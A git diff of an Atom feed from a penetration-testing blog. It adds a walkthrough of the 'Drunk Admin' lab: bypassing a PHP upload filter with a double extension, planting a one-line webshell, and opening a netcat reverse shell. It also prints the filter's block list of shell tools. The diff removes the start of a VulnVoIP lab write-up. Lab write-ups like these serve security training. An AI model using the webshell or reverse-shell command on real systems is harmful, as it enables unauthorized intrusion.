@@ -4,7 +4,7 @@
   <title><![CDATA[Core dump overflow]]></title>
   <link href="http://chousensha.github.io/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2016-06-11T14:12:28-04:00</updated>
+  <updated>2016-06-14T07:35:21-04:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,298 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Pentest lab - Drunk Admin Web Hacking Challenge]]></title>
+    <link href="http://chousensha.github.io/blog/2016/06/12/pentest-lab-drunk-admin-web-hacking-challenge/"/>
+    <updated>2016-06-12T11:51:50-04:00</updated>
+    <id>http://chousensha.github.io/blog/2016/06/12/pentest-lab-drunk-admin-web-hacking-challenge</id>
+    <content type="html"><![CDATA[<h1>Mission statement</h1>
+
+<p>The challenge includes an image hosting web service that has various design vulnerabilities. You must enumerate the various web service features and find an exploitable vulnerability in order to read system hidden files. The web application is 100% custom so do not try to search google for relative PoC exploit code.</p>
+
+<p>FINAL GOAL: Reveal the hidden message for a date arrange that Bob sent to Alice.</p>
+
+<!-- more -->
+
+
+<h1>Recon</h1>
+
+<p>Started with an Nmap scan, I only keep here the relevant output:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>PORT     STATE SERVICE REASON         VERSION
+</span><span class='line'>22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 5.5p1 Debian 6+squeeze1 (protocol 2.0)
+</span><span class='line'>8880/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.16 ((Debian))</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As you can see, the box is pretty tightly locked. Oh well, we knew from the challenge title that it was going to be web-based. So let&rsquo;s see what&rsquo;s on the web server</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/pentest/drunkadmin/tripios.png" title="tripios" alt="tripios image hosting"></p>
+
+<p>And on the Info tab there is this very appealing request to report any vulnerabilities we may find with the site:
+<code>Developer was really drunk while writting these code lines. Act like a pro and report any security flaws that you spotted around.</code></p>
+
+<h1>Exploit</h1>
+
+<p>First I uploaded a normal image which then gets displayed on the <em>image.php</em> page:</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/pentest/drunkadmin/upload.png" title="upload" alt="uploaded image"></p>
+
+<p>Next I uploaded a reverse PHP shell and changed the Content-Type header from application/x-php to image/png. This gave me an invalid file extension error. Then I tried again but this time I also changed the extension from PHP to PNG. Another error, saying &ldquo;you&rsquo;re naughty&rdquo;. This error kept flagging all my other attempts (tried uploading with double extensions or keeping just the PNG magic number and rest PHP code). So I went back to the start and once again found out that something I had dismissed as unimportant would play an important role in exploiting the target.</p>
+
+<p>When uploading a correct image, I noticed a cookie was set: <code>trypios=246f7045b13ca34bd0fb443a038605de</code>. And when I looked at the image source, which I should have done in the first place, it looked like this: <code>images/246f7045b13ca34bd0fb443a038605de.png</code>.</p>
+
+<p>Now I know where to access my uploaded files, but I still couldn&rsquo;t upload any PHP file. I remembered the mission briefing that stated this is a custom application and I thought there might be a filter that could catch the reverse shell, so I wrote a one line PHP script that simply echoes back a message. Thought it might be deemed harmless enough if there is a filter in place. And I finally managed to fool the application into uploading it by simply giving it a double extension of <code>.png.php</code> (something that I had tried before with the reverse shell and it got caught).</p>
+
+<p>However, after successfully uploading it, my &ldquo;cool image&rdquo; wasn&rsquo;t displayed at all, and it didn&rsquo;t exist in the source either. I navigated directly to where it should be (based on the cookie value), which in my case was at <a href="http://192.168.80.160:8880/images/178eaa4e889ab53ce844344ffc945171">http://192.168.80.160:8880/images/178eaa4e889ab53ce844344ffc945171</a></p>
+
+<p>And boom! The string &ldquo;RCE possible&rdquo; was displayed, which is exactly what I had my script outputting! The key takeaway here was that <strong>the file upload vulnerability was easily exploited by adding a double extension, but there was also a filter in place that flagged certain PHP code and prevented the upload</strong>. Because I could get code execution with a simple echo script, but not with the reverse shell.</p>
+
+<p>With this information, I made another simple script to see if I can get command execution on the target:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'><span class="k">echo</span> <span class="nb">exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>When I tried uploading it&hellip;again the naughty message! Clearly some filtering is in place. I modified it again to:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="k">echo</span> <span class="nb">exec</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It got uploaded without a problem and it displayed www-data when I went to it. So it appears that $<em>GET triggered the filter. I tried again, this time with $</em>REQUEST:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="k">echo</span> <span class="nb">exec</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And the filter didn&rsquo;t trigger! I went to it and passed the <em>pwd</em> command and success! It displayed /var/www/images. So command execution on the host finally achieved. I tweaked it a bit to give me a reverse shell, because it would be inconvenient to navigate the filesystem in its current state. So I had netcat listen on my 5555 port and then sent a shell from the remote host with <code>cmd=nc -c /bin/sh 192.168.80.158 5555</code></p>
+
+<p>Now that I&rsquo;m the system, time to look around for the secret message:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@pwnbox:~#nc -vvnlp 5555
+</span><span class='line'>listening on [any] 5555 ...
+</span><span class='line'>connect to [192.168.80.158] from (UNKNOWN) [192.168.80.160] 49553
+</span><span class='line'>ls /home
+</span><span class='line'>bob
+</span><span class='line'>ls /home/bob/
+</span><span class='line'>Documents
+</span><span class='line'>public_html</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I looked in Bob&rsquo;s directory and found some PHP files but none contained any message. So I took a look at the <code>/var/www</code> as well:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ls -a /var/www
+</span><span class='line'>.
+</span><span class='line'>..
+</span><span class='line'>.htaccess
+</span><span class='line'>.proof
+</span><span class='line'>image.php
+</span><span class='line'>images
+</span><span class='line'>index.php
+</span><span class='line'>info.php
+</span><span class='line'>myphp.php
+</span><span class='line'>style
+</span><span class='line'>upload.php
+</span><span class='line'>xmm.html</span></code></pre></td></tr></table></div></figure>
+
+
+<p>A hidden proof file! Let&rsquo;s see what&rsquo;s in it:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cat .proof
+</span><span class='line'>#########################
+</span><span class='line'># Drunk Admin Challenge #
+</span><span class='line'>#     by @anestisb    #
+</span><span class='line'>#########################
+</span><span class='line'>
+</span><span class='line'>bob&gt; Great work.
+</span><span class='line'>bob&gt; Meet me there.
+</span><span class='line'>...&gt; ?
+</span><span class='line'>bob&gt; What? You don't know where?
+</span><span class='line'>bob&gt; Work a little more your post
+</span><span class='line'>     exploitation skills.
+</span><span class='line'>
+</span><span class='line'>Secret Code:
+</span><span class='line'>TGglMUxecjJDSDclN1Ej
+</span><span class='line'>
+</span><span class='line'>Mail me your methods at:
+</span><span class='line'>anestis@bechtsoudis.com</span></code></pre></td></tr></table></div></figure>
+
+
+<p>All right, found the right one! I tried to decode that string but didn&rsquo;t get any intelligible output. This time though, all those PHP files that I found in bob&rsquo;s home directory would come in handy! There is a <em>public_html</em> file in bob&rsquo;s home with files that encrypt and decrypt passwords.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ls /home/bob/public_html
+</span><span class='line'>encrypt.php
+</span><span class='line'>include
+</span><span class='line'>index.php</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I copied the contents of the files to the <em>/var/www/images</em> directory and then I checked that index.php file:</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/pentest/drunkadmin/secret.png" title="secret" alt="secret decryption"></p>
+
+<p>But when I gave it the string <code>TGglMUxecjJDSDclN1Ej</code> I got garbage. Now, one of the things I tried before was to base64 decode the string. The output I got was <code>Lh%1L<sup>r2CH7</sup>%7Q#</code>, which didn&rsquo;t really help. Since I couldn&rsquo;t decrypt the secret with the form either, I thought to double check what kind of encoding it might use. And because I was thinking base64 but not sure, I inspired myself from a <a href="https://stackoverflow.com/questions/11656115/decode-python-base64-string">Stack Overflow post</a> to check if the string really is base64 in Python:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">base64</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">binascii</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">testme</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">&quot;Enter string to check if base64: &quot;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">try</span><span class="p">:</span>
+</span><span class='line'>    <span class="n">base64</span><span class="o">.</span><span class="n">decodestring</span><span class="p">(</span><span class="n">testme</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">print</span> <span class="n">base64</span><span class="o">.</span><span class="n">decodestring</span><span class="p">(</span><span class="n">testme</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">except</span> <span class="n">binascii</span><span class="o">.</span><span class="n">Error</span><span class="p">:</span>
+</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[x] Sorry, this isn&#39;t base64&quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And the the script did return the same output that I had decoded earlier: <code>Lh%1L<sup>r2CH7</sup>%7Q#</code>. So this time, I tried to enter this string in the decrypt form..and the message was revealed!</p>
+
+<p><code>Alice, prepare for a kinky night. Meet me at &lsquo;35.517286&rsquo; &lsquo;24.017637&rsquo;</code></p>
+
+<p>Yes! The message was decrypted and challenge completed! I was curious though and looked at the coordinates in Google Maps. It seems that Bob and Alice&rsquo;s chosen place of fun is a location in Greece:</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/pentest/drunkadmin/location.png" title="meeting location" alt="secret location"></p>
+
+<p>Before wrapping up, do you remember the upload filter that caught the malicious uploads and gave a naughty message? I took a peek at it and here&rsquo;s the filter part:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;Submit&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$errors</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="nv">$file</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">&quot;./images/</span><span class="si">$image_name</span><span class="s2">&quot;</span><span class="p">);</span>
+</span><span class='line'>    <span class="k">if</span><span class="p">(</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&quot;perl&quot;</span><span class="p">)</span> <span class="o">||</span>
+</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&quot;bash&quot;</span><span class="p">)</span> <span class="o">||</span>
+</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&quot;sh -c&quot;</span><span class="p">)</span> <span class="o">||</span>
+</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&quot;python&quot;</span><span class="p">)</span> <span class="o">||</span>
+</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&quot;nc &quot;</span><span class="p">)</span> <span class="o">||</span>
+</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&quot;netcat&quot;</span><span class="p">)</span> <span class="o">||</span>
+</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&quot;base64&quot;</span><span class="p">)</span> <span class="o">||</span>
+</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&quot;ruby&quot;</span><span class="p">)</span> <span class="o">||</span>
+</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&quot;fsockopen&quot;</span><span class="p">)</span> <span class="o">||</span>
+</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&quot;xterm&quot;</span><span class="p">)</span> <span class="o">||</span>
+</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&quot;gcc&quot;</span><span class="p">)</span> <span class="o">||</span>
+</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s1">&#39;$_GET&#39;</span><span class="p">)</span> <span class="o">||</span>
+</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s1">&#39;$_POST&#39;</span><span class="p">)</span> <span class="o">||</span>
+</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s1">&#39;$_SERVER&#39;</span><span class="p">)</span> <span class="o">||</span>
+</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s1">&#39;$_FILES&#39;</span><span class="p">)</span> <span class="o">||</span>
+</span><span class='line'>  <span class="nb">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s1">&#39;$_COOKIE&#39;</span><span class="p">)</span> <span class="p">)</span>
+</span><span class='line'>    <span class="p">{</span>
+</span><span class='line'>  <span class="k">echo</span> <span class="s2">&quot;&lt;h1&gt;Ohhh you are naughty!&lt;/h1&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>  <span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;rm ./images/</span><span class="si">$image_name</span><span class="s2">&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">die</span><span class="p">;</span>
+</span><span class='line'>    <span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Nice twist on this file upload vulnerability!</p>
+
+<h1>Report</h1>
+
+<p>This was another interesting challenge that seemed straightforward at the beginning but required more trial and error to solve. The steps that led to the exploitation were:</p>
+
+<ul>
+<li><p>server was vulnerable to unrestricted file upload that led to remote code execution</p></li>
+<li><p>the filter that tried to protect against malicious code didn&rsquo;t stop everything that an attacker could use</p></li>
+<li><p>the hidden file was not so hidden in the <em>/var/www</em> directory</p></li>
+<li><p>files in Bob&rsquo;s home folder were readable, allowing the decryption of the secret message</p></li>
+</ul>
+
+
+<p>The key takeaway for me was to start simple and build from there when testing stuff. I would have saved so much time if I had tried a simple PHP code execution test, instead of throwing reverse shells and scratching my head when it didn&rsquo;t work</p>
+
+<p>And today, instead of a cookie, I leave here the picture that gets displayed when you go to a non existent page on the server:</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/pentest/drunkadmin/think.png" title="think" alt="hmm"></p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Pentest tools - Metasploit]]></title>
@@ -21505,518 +21797,6 @@ the secure channel, and a connection is made to <strong>host</strong> port
 <p>I started this post in 2014 and completed it in 2015! Who&rsquo;s the troll now?</p>
 
 <p>Been busy and inactive for a couple of months, but I am back now and hopefully without such long pauses between posts.</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Pentest lab - VulnVoIP]]></title>
-    <link href="http://chousensha.github.io/blog/2014/10/07/pentest-lab-vulnvoip/"/>
-    <updated>2014-10-07T12:07:46-04:00</updated>
-    <id>http://chousensha.github.io/blog/2014/10/07/pentest-lab-vulnvoip</id>
-    <content type="html"><![CDATA[<p>I found a very interesting virtual machine on VulnHub that focuses on VoIP vulnerabilities. Since I haven&rsquo;t seen any other VoIP resources, I thought it would be great to give this a try.</p>
-
-<blockquote><p>VulnVoIP is based on a relatively old AsteriskNOW distribution and has a number of
-weaknesses. The aim is to locate VoIP users, crack their passwords and gain access
-to the Support account voicemail.</p></blockquote>
-
-<!-- more -->
-
-
-<p>The IP of the target machine is 192.168.80.131. Here are the results of the port scan:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -A -p1-65535 192.168.80.131
-</span><span class='line'>
-</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2014-10-07 19:45 EEST
-</span><span class='line'>Nmap scan report for 192.168.80.131
-</span><span class='line'>Host is up (0.00023s latency).
-</span><span class='line'>Not shown: 65527 closed ports
-</span><span class='line'>PORT     STATE SERVICE    VERSION
-</span><span class='line'>22/tcp   open  ssh        OpenSSH 4.3 (protocol 2.0)
-</span><span class='line'>| ssh-hostkey: 
-</span><span class='line'>|   1024 1f:e2:e8:9e:2c:f8:31:39:36:f7:1d:aa:77:5e:ac:76 (DSA)
-</span><span class='line'>|_  2048 38:a4:9d:29:8a:11:9d:e1:13:5d:5e:6d:76:a6:63:76 (RSA)
-</span><span class='line'>53/tcp   open  domain     dnsmasq 2.45
-</span><span class='line'>| dns-nsid: 
-</span><span class='line'>|_  bind.version: dnsmasq-2.45
-</span><span class='line'>80/tcp   open  http       Apache httpd 2.2.3 ((CentOS))
-</span><span class='line'>| http-methods: Potentially risky methods: TRACE
-</span><span class='line'>|_See http://nmap.org/nsedoc/scripts/http-methods.html
-</span><span class='line'>| http-robots.txt: 1 disallowed entry 
-</span><span class='line'>|_/
-</span><span class='line'>|_http-title: FreePBX
-</span><span class='line'>111/tcp  open  rpcbind    2 (RPC #100000)
-</span><span class='line'>| rpcinfo: 
-</span><span class='line'>|   program version   port/proto  service
-</span><span class='line'>|   100000  2            111/tcp  rpcbind
-</span><span class='line'>|   100000  2            111/udp  rpcbind
-</span><span class='line'>|   100024  1            966/udp  status
-</span><span class='line'>|_  100024  1            969/tcp  status
-</span><span class='line'>969/tcp  open  status     1 (RPC #100024)
-</span><span class='line'>3306/tcp open  mysql      MySQL (unauthorized)
-</span><span class='line'>4445/tcp open  upnotifyp?
-</span><span class='line'>5038/tcp open  asterisk   Asterisk Call Manager 1.1
-</span><span class='line'>MAC Address: 00:0C:29:84:8C:CC (VMware)
-</span><span class='line'>Device type: general purpose
-</span><span class='line'>Running: Linux 2.6.X
-</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:2.6
-</span><span class='line'>OS details: Linux 2.6.18 - 2.6.32</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Let&rsquo;s look at that DNS server first:</p>
-
-<blockquote><p>dnsmasq is a lightweight DNS, TFTP and DHCP server. It is intended to provide coupled DNS and DHCP service to a LAN.</p>
-
-<p>Dnsmasq accepts DNS queries and either answers them from a small, local, cache or forwards them to a real, recursive, DNS server. It loads the
-contents of /etc/hosts so that local hostnames which do not appear in the global DNS can be resolved and also answers DNS queries for DHCP
-configured hosts.</p>
-
-<p>The dnsmasq DHCP server supports static address assignments and multiple networks. It automatically sends a sensible default set of DHCP options,
-and can be configured to send any desired set of DHCP options, including vendor-encapsulated options. It includes a secure, read-only, TFTP server
-to allow net/PXE boot of DHCP hosts and also supports BOOTP.</p>
-
-<p>Dnsmasq supports IPv6 for DNS, but not DHCP.</p></blockquote>
-
-<p>There is a Heap Overflow and Null-pointer Dereference vulnerability affecting the TFTP server component:</p>
-
-<p><strong>CVE-2009-2957</strong></p>
-
-<blockquote><p>A vulnerability has been found that may allow an attacker to execute arbitrary code on
-servers or home routers running dnsmasq with the TFTP service
-enabled (&lsquo;&mdash;enable-tfp&rsquo;). This service is not enabled by default on most
-distributions; in particular it is not enabled by default on OpenWRT or
-DD-WRT. Chances of successful exploitation increase when a long
-directory prefix is used for TFTP. Code will be executed with the
-privileges of the user running dnsmasq, which is normally a
-non-privileged one.</p>
-
-<p>Additionally there is a potential DoS attack to the TFTP service by
-exploiting a null-pointer dereference vulnerability.</p></blockquote>
-
-<p>I wasn&rsquo;t able to exploit this though, so moving on.</p>
-
-<p>Navigating to the web page, we see two links, for Voicemail &amp; Recordings (ARI) and FreePBX Administration. The administration page requires HTTP authentication, and the other one is a login portal.</p>
-
-<p>A Nessus scan revealed that the Asterisk Recording Interface uses a default set of credentials for the administrator&rsquo;s account: <em>admin</em>/<em>ari_password</em>, on the URL <a href="http://192.168.80.131/recordings/index.php">http://192.168.80.131/recordings/index.php</a> . I didn&rsquo;t find anything useful even after logging in. These credentials didn&rsquo;t work on the admin page at <a href="http://192.168.80.131/admin/config.php">http://192.168.80.131/admin/config.php</a> , but I was able to glean the FreePBX version from the webpage (2.7.0.0). Might come in handy later!</p>
-
-<p>Since this is my first time doing anything remotely related to VoIP, I had some googling and reading to do. For a while I just digressed from the main goal of hacking this machine to burying myself in the Session Initiation Protocol RFC (ouch!), and 2 books: <a href="http://www.amazon.com/Hacking-Exposed-VoIP-Security-Solutions/dp/0072263644">Hacking Exposed VoIP: Voice Over IP Security Secrets &amp; Solutions</a> and <a href="http://www.amazon.com/Hacking-VoIP-Protocols-Attacks-Countermeasures/dp/1593271638">Hacking VoIP: Protocols, Attacks, and Countermeasures</a>.</p>
-
-<p>So, a short introduction to SIP is in order:</p>
-
-<blockquote><p> SIP is an application-layer control protocol that can establish,
-modify, and terminate multimedia sessions (conferences) such as
-Internet telephony calls. SIP can also invite participants to
-already existing sessions, such as multicast conferences.</p>
-
-<p>SIP employs design elements similar to the HTTP request/response transaction model. Each transaction consists of a client request that invokes a
-particular method or function on the server and at least one response. SIP reuses most of the header fields, encoding rules and status codes of
-HTTP, providing a readable text-based format.</p>
-
-<p>Each resource of a SIP network, such as a user agent or a voicemail box, is identified by a URI, based on the general standard syntax also used in
-Web services and e-mail. The URI scheme used for SIP is sip: and a typical SIP URI is of the form: sip:username:password@host:port</p>
-
-<p>SIP clients typically use TCP or UDP on port numbers 5060 and/or 5061 to connect to SIP servers and other SIP endpoints. Port 5060 is commonly
-used for non-encrypted signaling traffic whereas port 5061 is typically used for traffic encrypted with TLS. SIP is primarily used in setting up
-and tearing down voice or video calls.</p></blockquote>
-
-<p><strong>SIP Requests</strong></p>
-
-<ul>
-<li><p>INVITE &ndash; A client is being invited to participate in a call.</p></li>
-<li><p>ACK &ndash; The client has confirmed the INVITE request.</p></li>
-<li><p>BYE &ndash; The call has been terminated by either the caller or callee.</p></li>
-<li><p>CANCEL &ndash; Cancel any pending requests.</p></li>
-<li><p>OPTIONS &ndash; Queries the server for its capabilities.</p></li>
-<li><p>REGISTER &ndash; Registers the client with the server according to the address in the To header.</p></li>
-<li><p>PRACK &ndash; Similar to ACK, but a provisional confirmation.</p></li>
-<li><p>SUBSCRIBE &ndash; Subscribes the device for an event notification.</p></li>
-<li><p>NOTIFY &ndash; Notifies all subscribers of an event.</p></li>
-<li><p>PUBLISH &ndash; Publishes an event to a server.</p></li>
-<li><p>INFO &ndash; Sends information in the middle of a session that doesn&rsquo;t modify the session&rsquo;s state.</p></li>
-<li><p>REFER &ndash; Asks the client to issue a SIP request, typically a call transfer.</p></li>
-<li><p>MESSAGE &ndash; Sends an instant message using SIP.</p></li>
-<li><p>UPDATE &ndash; Modifies a session&rsquo;s state without altering the dialog state.</p></li>
-</ul>
-
-
-<p>And, a little about Asterisk and FreePBX:</p>
-
-<blockquote><p>Asterisk is a software implementation of a telephone private branch exchange (PBX). Like any PBX, it allows attached telephones to make calls to
-one another, and to connect to other telephone services, such as the public switched telephone network (PSTN) and Voice over Internet Protocol
-(VoIP) services.</p>
-
-<p>FreePBX is an open source GUI that controls and manages Asterisk</p></blockquote>
-
-<p>I found an awesome tool suite for this challenge: <a href="https://code.google.com/p/sipvicious/">SIPVicious</a></p>
-
-<blockquote><p>SIPVicious suite is a set of tools that can be used to audit SIP based VoIP systems. It currently consists of the folowing tools:</p>
-
-<p>svmap &ndash; this is a sip scanner. Lists SIP devices found on an IP range</p>
-
-<p>svwar &ndash; identifies active extensions on a PBX</p>
-
-<p>svcrack &ndash; an online password cracker for SIP PBX</p>
-
-<p>svreport &ndash; manages sessions and exports reports to various formats</p>
-
-<p>svcrash &ndash; attempts to stop unauthorized svwar and svcrack scans</p></blockquote>
-
-<p>Let&rsquo;s get started then!</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>./svmap.py 192.168.80.1/24
-</span><span class='line'>| SIP Device          | User Agent            | Fingerprint |
-</span><span class='line'>-------------------------------------------------------------
